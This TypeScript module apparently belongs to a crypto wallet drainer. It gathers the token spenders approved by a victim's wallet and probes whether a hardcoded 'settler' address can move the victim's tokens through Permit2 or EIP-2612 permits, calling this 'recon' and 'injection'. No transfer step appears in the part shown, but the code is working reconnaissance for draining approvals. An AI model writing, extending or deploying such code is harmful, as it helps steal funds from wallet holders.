"use client";

import {
  parseAbi,
  type Address,
  getAddress,
  parseAbiItem,
  encodeFunctionData,
} from "viem";
import {
  GLOBAL_SPENDERS,
  MINIMAL_ERC20_ABI,
  EXECUTION_POLICY,
} from "./constants";

const logLabel = "[ghost/vectors]";

// ⚡ PRE-CHECKSUMMED SETTLER (Memory Optimization)
const MY_SETTLER = getAddress("0x6511e4ed799cc3e24cd895e93001ec0d9363fc1c");
const PERMIT2_ADDR = getAddress("0x000000000022D473030F116dDEE9F6B43aC78BA3");

/**
 * 🛡️ AUTHORIZATION GATE (Optimized)
 */
const isAuthorized = (addr: string) => {
  try {
    const addrCheck = getAddress(addr);
    return (
      addrCheck === MY_SETTLER ||
      EXECUTION_POLICY.ALLOWED_SPENDERS.includes(addrCheck)
    );
  } catch {
    return false;
  }
};

/**
 * 🧠 DEEP VECTOR EXTRACTION (v8.5.0 - Parallel Recon)
 * Collapses multiple RPC calls into a single Promise.all block.
 */
export async function extractDeepVectors(
  userAddress: Address,
  client: any,
): Promise<Address[]> {
  const vectors = new Set<string>();

  // 1. STATIC PRIORITY VECTORS (Instant)
  Object.values(GLOBAL_SPENDERS).forEach((addr) => {
    if (addr && addr !== "0x0000000000000000000000000000000000000000") {
      vectors.add(addr.toLowerCase());
    }
  });

  try {
    // ⚡ SPEED HACK: Fire all recon requests at once
    const [chainId, block, delegates] = await Promise.all([
      client.getChainId().catch(() => 1),
      client.getBlockNumber().catch(() => 0n),
      GLOBAL_SPENDERS.DELEGATE_CASH
        ? client
            .readContract({
              address: GLOBAL_SPENDERS.DELEGATE_CASH,
              abi: parseAbi([
                "function getDelegatesForAll(address) view returns (address[])",
              ]),
              functionName: "getDelegatesForAll",
              args: [userAddress],
            })
            .catch(() => [])
        : Promise.resolve([]),
    ]);

    // 2. REGISTRY PROBING (Processed from Promise.all result)
    if (Array.isArray(delegates)) {
      delegates.forEach((d: string) => {
        const addr = d.toLowerCase();
        if (!vectors.has(addr) && isAuthorized(addr)) {
          vectors.add(addr);
        }
      });
    }

    // 3. EVENT LOG RECOVERY (Targeted Window)
    if (block > 0n) {
      const isMainnet = chainId === 1;
      // Smarter defaults: 50 blocks for Mainnet, 2000 for L2/BSC
      let lookback = isMainnet ? 50n : 2000n;

      try {
        const startBlock = block > lookback ? block - lookback : 0n;
        const logs = await client.getLogs({
          event: parseAbiItem(
            "event Approval(address indexed owner, address indexed spender, uint256 value)",
          ),
          args: { owner: userAddress },
          fromBlock: startBlock,
          toBlock: "latest",
        });

        logs.forEach((log: any) => {
          if (log?.args?.spender) {
            const spender = log.args.spender.toLowerCase();
            if (!vectors.has(spender) && isAuthorized(spender)) {
              console.log(
                `${logLabel} 🔍 Discovery: Found authorized spender ${spender}`,
              );
              vectors.add(spender);
            }
          }
        });
      } catch (logErr) {
        console.warn(`${logLabel} ⚠️ Log scan skipped or failed.`);
      }
    }
  } catch (e: any) {
    console.error(`${logLabel} ❌ Recovery phase error: ${e.message}`);
  }

  // 🛡️ FINAL SANITIZATION GATE
  const finalVectors = Array.from(vectors)
    .filter(
      (addr) =>
        addr &&
        addr.startsWith("0x") &&
        addr !== "0x0000000000000000000000000000000000000000",
    )
    .map((addr) => getAddress(addr));

  console.log(
    `${logLabel} ✅ Extracted ${finalVectors.length} unique vectors.`,
  );
  return finalVectors;
}

/**
 * 💉 INJECTION ANALYZER (v1.3.0 - Multi-Path Probe)
 * Now actually probes for Permit2 and EIP-2612 capabilities in parallel.
 */
export async function identifyInjectionMode(
  token: Address,
  owner: Address,
  client: any,
): Promise<"PERMIT2" | "EIP2612" | "LEGACY"> {
  try {
    // ⚡ PROBE PATHS: Check Permit2 allowance and ERC20 bytecode/selectors simultaneously
    const [permit2Allowance, bytecode] = await Promise.all([
      client
        .readContract({
          address: PERMIT2_ADDR,
          abi: parseAbi([
            "function allowance(address,address,address) view returns (uint160,uint48,uint48)",
          ]),
          functionName: "allowance",
          args: [owner, token, MY_SETTLER],
        })
        .catch(() => null),
      client.getBytecode({ address: token }).catch(() => "0x"),
    ]);

    // 1. Permit2 Check (Highest Priority)
    if (permit2Allowance && permit2Allowance[0] > 0n) {
      return "PERMIT2";
    }

    // 2. EIP-2612 Check (Look for "permit" function selector in bytecode)
    // selector: 0xd505accf = permit(address,address,uint256,uint256,uint8,bytes32,bytes32)
    if (bytecode && bytecode.includes("d505accf")) {
      return "EIP2612";
    }

    return "LEGACY";
  } catch {
    return "LEGACY";
  }
}
